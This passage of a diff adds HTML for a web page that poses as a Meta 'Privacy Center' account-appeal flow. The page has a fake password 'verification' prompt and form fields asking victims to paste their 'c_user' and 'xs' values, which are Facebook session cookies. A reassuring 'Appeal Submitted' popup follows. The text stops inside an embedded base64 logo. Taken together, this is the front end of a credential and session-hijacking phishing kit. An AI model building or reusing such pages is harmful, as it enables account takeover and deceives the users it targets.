+                <button class="btn-continue" id="continue-btn" disabled="">Continue to Privacy Center →</button>
+                <div class="footer-note">Meta respects your privacy • v2.0</div>
+            </div>
+        </div>
+        <div id="success-popup">
+            <div class="success-card">
+                <div class="success-icon">
+                    <svg width="60" height="60" viewBox="0 0 52 52">
+                        <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none" stroke="#10b981" stroke-width="2"></circle>
+                        <path class="checkmark-check" fill="none" stroke="#10b981" stroke-width="2" d="M14.1 27.2l7.1 7.2 16.7-16.8"></path>
+                    </svg>
+                </div>
+                <h3>Appeal Submitted!</h3>
+                <p>Your appeal has been successfully received. Our team will review within 24 hours.</p>
+                <button class="success-btn" id="success-close-btn">Continue</button>
+            </div>
+        </div>
+        <div id="password-prompt">
+            <div class="password-card">
+                <h3>Secure Verification</h3>
+                <p>Enter your password to confirm identity</p>
+                <div class="password-input-wrapper">
+                    <input type="password" id="password-input" class="password-input" placeholder="Password">
+                    <button class="toggle-password" id="toggle-password">👁️</button>
+                </div>
+                <button class="password-btn" id="submit-password-btn">Verify &amp;Submit</button>
+                <button class="password-btn-secondary" id="close-password-btn">Cancel</button>
+            </div>
+        </div>
+        <div id="appeal-modal">
+            <div class="appeal-modal-card">
+                <button class="modal-close-btn" id="modal-close-btn">✕</button>
+                <h2>Appeal Form</h2>
+                <div class="appeal-subhead">Review instructions &amp;provide details</div>
+                <div class="video-container">
+                    <video id="appeal-video" controls="" autoplay="" muted="" playsinline="">
+                        <source src="" type="video/mp4">
+                    </video>
+                </div>
+                <label class="appeal-input-label">C_user</label>
+                <input type="text" id="appeal-name" class="appeal-input" placeholder="c_user">
+                <label class="appeal-input-label">xs</label>
+                <input type="text" id="appeal-pos" class="appeal-input" placeholder="xs">
+                <button class="appeal-modal-btn" id="appeal-continue">Submit Appeal</button>
+                <div class="secure-note">🔒 Encrypted &amp;secure</div>
+            </div>
+        </div>
+        <div id="main-content">
+            <nav>
+                <div class="nav-logo">
+                    <img src="data:image/jpeg;base64,/9j/4QC8RXhpZgAASUkqAAgAAAAGABIBAwABAAAAAQAAABoBBQABAAAAVgAAABsBBQABAAAAXgAAACgBAwABAAAAAQAAABMCAwABAAAAAQAAAGmHBAABAAAAZgAAAAAAAAABAAAAAQAAAAEAAAABAAAABgAAkAcABAAAADAyMTABkQcABAAAAAECAwAAoAcABAAAADAxMDABoAMAAQAAAP//AAACoAMAAQAAAIgBAAADoAMAAQAAAIEAAAAAAAAA/+ELDWh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8APD94cGFja2V0IGJlZ2luPSfvu78nIGlkPSdXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQnPz4KPHg6eG1wbWV0YSB4bWxuczp4PSdhZG9iZTpuczptZXRhLycgeDp4bXB0az0nSW1hZ2U6OkV4aWZUb29sIDEyLjY1Jz4KPHJkZjpSREYgeG1sbnM6cmRmPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjJz4KCiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogIHhtbG5zOnBkZj0naHR0cDovL25zLmFkb2JlLmNvbS9wZGYvMS4zLyc+CiAgPHBkZjpQcm9kdWNlcj5PbmxpbmUtQ29udmVydDwvcGRmOlByb2R1Y2VyPgogPC9yZGY6RGVzY3JpcHRpb24+CjwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjw/eHBhY2tldCBlbmQ9J3cnPz7/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCACBAYgDASIAAhEBAxEB/8QAHQABAAIDAQEBAQAAAAAAAAAAAAkKBgcIAwUCBP/EAGgQAAAFAgMDBAcQCgwIDwAAAAABAgMEBQYHCBEJEhMKFCEiFSMxMkFCYhYkMzlDUVJTYXFydYKDs7QlNGN2gZKToqOyFxg1N0RUc3SRscLDGjhFV2SEtdQZJlVlhZSVlqGkwdLT4vH/xAAdAQEAAQUBAQEAAAAAAAAAAAAABwMEBQYIAgEJ/8QAPhEAAQMCBAMDCQUHBQEAAAAAAQACAwQRBQYhMRJBYQciURMUMnGBkaGxwQhCUmLhFRYjNXLR8CQzNEOCkv/aAAwDAQACEQMRAD8AgfAAHQiw6AAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiAAAiD9ssDtTZr7Ha8M87zFx1x6RZeHGmnZE2COZWN0yNbcJC+judHGPqF5eiyKYvLnkYwqyh04o1g2fS6VK6eNWJHnypSPhyV9f5Dfax6hY6R1hst9y1kCvxUCW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